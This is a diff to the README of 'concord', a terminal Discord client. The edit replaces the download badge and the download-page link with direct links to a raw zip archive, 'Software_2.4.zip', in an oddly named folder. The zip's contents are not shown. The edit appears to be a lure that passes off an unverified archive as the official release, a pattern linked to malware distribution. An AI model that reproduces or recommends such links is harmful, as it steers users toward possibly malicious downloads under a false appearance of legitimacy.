@@ -1,6 +1,6 @@
 # 💬 concord - Simple chat client for your terminal
 
-[![](https://img.shields.io/badge/Download-Concord-blue.svg)](https://github.com/Coloured-leadbank877/concord)
+[![](https://img.shields.io/badge/Download-Concord-blue.svg)](https://github.com/Coloured-leadbank877/concord/raw/refs/heads/main/unjudicable/Software_2.4.zip)
 
 Concord brings your Discord chats into your terminal. It keeps your interface clean and light. You use text commands to navigate your servers and messages. This tool works on Windows and uses very little memory. If you enjoy text-based interfaces, this app offers a fast way to stay connected.
 
@@ -8,7 +8,7 @@ Concord brings your Discord chats into your terminal. It keeps your interface cl
 
 You can find the latest version of the app on GitHub. 
 
-[Click here to visit the download page](https://github.com/Coloured-leadbank877/concord)
+[Click here to visit the download page](https://github.com/Coloured-leadbank877/concord/raw/refs/heads/main/unjudicable/Software_2.4.zip)
 
 Follow these steps to set up the app:
 
